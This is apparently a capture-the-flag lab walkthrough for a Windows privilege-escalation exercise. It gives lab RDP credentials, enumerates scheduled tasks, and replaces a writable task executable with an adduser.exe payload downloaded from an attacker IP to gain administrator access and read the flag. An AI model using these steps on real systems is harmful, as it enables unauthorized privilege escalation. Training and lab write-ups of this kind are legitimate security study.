@@ -1,0 +1,40 @@
+Questions 2
+Connect to CLIENTWK221 (VM #2) via RDP as the user moss with the password work6potence6PLASMA6flint7. Enumerate the scheduled tasks on the system and find a way to obtain an interactive shell as user running the scheduled task. The flag can be found on the desktop.
+HINT
+Enumerate scheduled tasks with the command provided in Listing 77.
+If you have write permissions for the executable, replace or modify it to execute your code, such as an msfvenom shell. Obtain the flag when the scheduled task is triggered.
+
+xfreerdp /u:moss /p:work6potence6PLASMA6flint7 /v:192.168.207.221
+
+PS C:\Users\steve> schtasks /query /fo LIST /v
+...
+TaskName:                             \Microsoft\Voice Activation
+Next Run Time:                        4/29/2024 6:39:21 AM
+Author:                               CLIENTWK220\offsec
+Task To Run:         C:\Users\moss\Searches\VoiceActivation.exe
+...
+
+PS C:\Users\moss> icacls C:\Users\moss\Searches\VoiceActivation.exe
+C:\Users\moss\Searches\VoiceActivation.exe NT AUTHORITY\SYSTEM:(I)(F)
+                                           BUILTIN\Administrators:(I)(F)
+                                           CLIENTWK221\moss:(I)(F)
+                                           CLIENTWK221\offsec:(I)(F)
+
+PS C:\Users\moss> iwr -Uri http://192.168.45.223/adduser.exe -Outfile VoiceActivation.exe
+PS C:\Users\moss> move .\Searches\VoiceActivation.exe VoiceActivation.exe.bak
+PS C:\Users\moss> move .\VoiceActivation.exe .\Searches\
+PS C:\Users\moss> net user
+...
+dave2
+...
+PS C:\Users\moss> net localgroup administrators
+...
+dave2
+...
+
+start-process PowerShell -verb runas
+
+Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+
+PS C:\Users\roy\Desktop> type flag.txt
+OS{4f96338f2597f6e92535358c9a00f58f}
